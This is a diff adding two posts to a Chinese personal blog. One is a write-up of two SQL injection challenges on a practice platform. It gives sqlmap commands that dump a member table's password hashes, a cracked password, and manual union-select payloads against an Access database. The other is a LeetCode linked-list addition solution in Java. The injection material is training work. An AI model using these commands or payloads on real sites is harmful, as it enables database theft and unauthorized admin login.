@@ -300,6 +300,434 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://prontosil.club/2019/07/15/两道sql注入题/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="百浪多息">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://upload-images.jianshu.io/upload_images/10651191-c6a2b693f2366bdc.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="prontosil">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/15/两道sql注入题/" itemprop="url">两道sql注入题</a></h1>
+        
+
+		
+
+        <div class="post-meta">
+         
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-15T09:16:49+08:00">
+                2019-07-15
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Post modified&#58;</span>
+              
+              <time title="Post modified" itemprop="dateModified" datetime="2019-07-15T09:18:46+08:00">
+                2019-07-15
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/mozhe/" itemprop="url" rel="index">
+                    <span itemprop="name">mozhe</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  425
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  1
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="基于sql的盲注"><a href="#基于sql的盲注" class="headerlink" title="基于sql的盲注"></a>基于sql的盲注</h1><p>之前一直没有好好地学习过<code>sqlmap</code>的使用方法</p>
+<p>如果是针对post表单这种方式</p>
+<ol>
+<li>可以将抓到的包保存成一个文件，然后使用 <code>sqlmap.py -r &quot;post.txt&quot; -p n --dbs</code> 其中<code>-p</code>是指定参数</li>
+<li>sqlmap也可以自动搜寻表单<code>sqlmap.py -u &quot;url&quot; --forms</code></li>
+<li>指定参数</li>
+</ol>
+<p>趁机学到了一把<code>sqlmap</code>使用<br>虽然这个题目是有点。。<br>但是注入点的判断也是很重要的</p>
+<h2 id="爆后端数据库"><a href="#爆后端数据库" class="headerlink" title="爆后端数据库"></a>爆后端数据库</h2><p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot;</code></p>
+<p><img src="https://i.imgur.com/8EdgoS3.png" alt="backdatabase"></p>
+<h2 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h2><p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs</code></p>
+<p><img src="https://i.imgur.com/JqIhPQS.png" alt="database"></p>
+<h2 id="指定数据库报表爆表"><a href="#指定数据库报表爆表" class="headerlink" title="指定数据库报表爆表"></a>指定数据库报表爆表</h2><p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup --tables</code></p>
+<p><img src="https://i.imgur.com/qNL5qbg.png" alt="table"></p>
+<h2 id="指定数据库和表爆字段"><a href="#指定数据库和表爆字段" class="headerlink" title="指定数据库和表爆字段"></a>指定数据库和表爆字段</h2><p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member --columns</code></p>
+<p><img src="https://i.imgur.com/nd1VTmg.png" alt="column"></p>
+<h2 id="指定数据库，表，字符然后dump出数据"><a href="#指定数据库，表，字符然后dump出数据" class="headerlink" title="指定数据库，表，字符然后dump出数据"></a>指定数据库，表，字符然后dump出数据</h2><p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member -C password --dump</code><br><img src="https://i.imgur.com/iRvoAHX.
+![password](https://i.imgur.com/B6oLiAA.png" alt="member"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: stormgroup</span><br><span class="line">Table: member</span><br><span class="line">[2 entries]</span><br><span class="line">+-------+----------------------------------+--------+</span><br><span class="line">| name  | password                         | status |</span><br><span class="line">+-------+----------------------------------+--------+</span><br><span class="line">| mozhe | 3114b433dece9180717f2b7de56b28a3 | 0      |</span><br><span class="line">| mozhe | b7a0bebf8287c87253fb2958a390346a | 1      |</span><br><span class="line">+-------+----------------------------------+--------+</span><br></pre></td></tr></table></figure></p>
+<p>解密之后是106370<br>这样就能登陆后台了<br><img src="https://i.imgur.com/6KXMijL.png" alt="houtai"><br><img src="https://i.imgur.com/yxq3qQi.png" alt="key0"><br>太神奇了</p>
+<p>参考<br><a href="https://blog.csdn.net/u011781521/article/details/58594941" target="_blank" rel="noopener">sqlmap之(六)——POST登陆框注入实战</a></p>
+<h1 id="SQL手工注入漏洞测试-Access数据库"><a href="#SQL手工注入漏洞测试-Access数据库" class="headerlink" title="SQL手工注入漏洞测试(Access数据库)"></a>SQL手工注入漏洞测试(Access数据库)</h1><p>这道题目就有点神奇了</p>
+<p>纯靠猜</p>
+<p><code>order by 4</code>判断有多少个字段</p>
+<p>然后 <code>new_list.asp?id=1 and exists(select * from admin)</code>判断是否存在<code>admin</code></p>
+<p><img src="https://i.imgur.com/UmyBe7l.png" alt="access0"><br>接下来判断回显位置<br><code>/new_list.asp?id=1 union select 1,2,3,4 from admin</code></p>
+<p><img src="https://i.imgur.com/eyqGQZO.png" alt="access1"><br>接下来猜测字段值<br><code>and exists (select id from admin)</code></p>
+<p>爆出字段值<br><code>union select 1,username,passwd,id from admin</code><br><img src="https://i.imgur.com/H5rq91S.png" alt="access2"></p>
+<p>md5解密一下登陆就行了</p>
+<p><a href="https://blog.csdn.net/qq_39936434/article/details/94718134" target="_blank" rel="noopener">参考</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://prontosil.club/2019/07/15/Leetcode-2/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="百浪多息">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://upload-images.jianshu.io/upload_images/10651191-c6a2b693f2366bdc.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="prontosil">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/15/Leetcode-2/" itemprop="url">Leetcode 2</a></h1>
+        
+
+		
+
+        <div class="post-meta">
+         
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-15T09:12:08+08:00">
+                2019-07-15
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Post modified&#58;</span>
+              
+              <time title="Post modified" itemprop="dateModified" datetime="2019-07-15T09:13:37+08:00">
+                2019-07-15
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/leetcode/" itemprop="url" rel="index">
+                    <span itemprop="name">leetcode</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  381
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  1
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p># 错解</p>
+<p>怎么快速地将链表倒置</p>
+<p>:confused:</p>
+<p><img src="https://i.imgur.com/phNwhfi.png" alt="wrong"></p>
+<p>最后还是因为溢出的问题</p>
+<p>思路：</p>
+<p>\<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">​        int k = 0;</span><br><span class="line"></span><br><span class="line">        ListNode temp1 = l1;</span><br><span class="line"></span><br><span class="line">        ListNode temp2 = l2;</span><br><span class="line"></span><br><span class="line">        double resultl1 = 0;</span><br><span class="line"></span><br><span class="line">        double resultl2 = 0;</span><br><span class="line"></span><br><span class="line">        while (temp1 != null) &#123;</span><br><span class="line"></span><br><span class="line">            int tempvalue = temp1.val;</span><br><span class="line"></span><br><span class="line">            resultl1 = resultl1 + tempvalue * Math.pow(10, k);</span><br><span class="line"></span><br><span class="line">            k++;</span><br><span class="line"></span><br><span class="line">            temp1 = temp1.next;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">\</span><br></pre></td></tr></table></figure></p>
+<p>就是将其转化为整数，因为链表的第一个元素是最低位，之后是十位，百位等</p>
+<p>将得到的结果在转化为链表</p>
+<p>\<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">        int result = (int) (resultl1 + resultl2);</span><br><span class="line"></span><br><span class="line">        ListNode ans = new ListNode(0); //先取一个头节点</span><br><span class="line"></span><br><span class="line">        ListNode head = ans;</span><br><span class="line"></span><br><span class="line">        int length = Integer.toString(result).length();</span><br><span class="line"></span><br><span class="line">        for (int i = 0; i &lt; length; i++) &#123;</span><br><span class="line"></span><br><span class="line">            ListNode temp = new ListNode(result % 10);</span><br><span class="line"></span><br><span class="line">            head.next = temp;</span><br><span class="line"></span><br><span class="line">            head = head.next;</span><br><span class="line"></span><br><span class="line">            result = result / 10;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">\</span><br></pre></td></tr></table></figure></p>
+<p>记录一下将整数转为string的操作</p>
+<p>> Integer.toString(result)</p>
+<p>Math.pow函数的返回值必须是double类型的</p>
+<p>但是这样会面临一个问题，也就是最开图片的那个，溢出！</p>
+<p># 正解</p>
+<p>看了眼答案，才明白自己从开始就想错了</p>
+<p>\<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public ListNode addTwoNumbers(ListNode l1, ListNode l2) &#123;</span><br><span class="line"></span><br><span class="line">    ListNode dummyHead = new ListNode(0);</span><br><span class="line"></span><br><span class="line">    ListNode p = l1, q = l2, curr = dummyHead;</span><br><span class="line"></span><br><span class="line">    int carry = 0;</span><br><span class="line"></span><br><span class="line">    while (p != null || q != null) &#123;</span><br><span class="line"></span><br><span class="line">        int x = (p != null) ? p.val : 0;</span><br><span class="line"></span><br><span class="line">        int y = (q != null) ? q.val : 0;</span><br><span class="line"></span><br><span class="line">        int sum = carry + x + y;</span><br><span class="line"></span><br><span class="line">        carry = sum / 10;</span><br><span class="line"></span><br><span class="line">        curr.next = new ListNode(sum % 10);</span><br><span class="line"></span><br><span class="line">        curr = curr.next;</span><br><span class="line"></span><br><span class="line">        if (p != null) p = p.next;</span><br><span class="line"></span><br><span class="line">        if (q != null) q = q.next;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (carry &gt; 0) &#123;</span><br><span class="line"></span><br><span class="line">        curr.next = new ListNode(carry);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return dummyHead.next;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">\</span><br></pre></td></tr></table></figure></p>
+<p>最关键的就是</p>
+<p>==int x = (p != null) ? p.val : 0;</p>
+<p>int y = (q != null) ? q.val : 0;</p>
+<p>int sum = carry + x + y;</p>
+<p>carry = sum / 10;</p>
+<p>curr.next = new ListNode(sum % 10);==</p>
+<p>其实只需要从低位开始一位位的加上去就好了。</p>
+<p>然后再把它们给链起来</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://prontosil.club/2019/05/04/格式化字符串分析/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -833,7 +1261,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">4</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -844,7 +1272,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">4</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
@@ -855,7 +1283,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">4</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
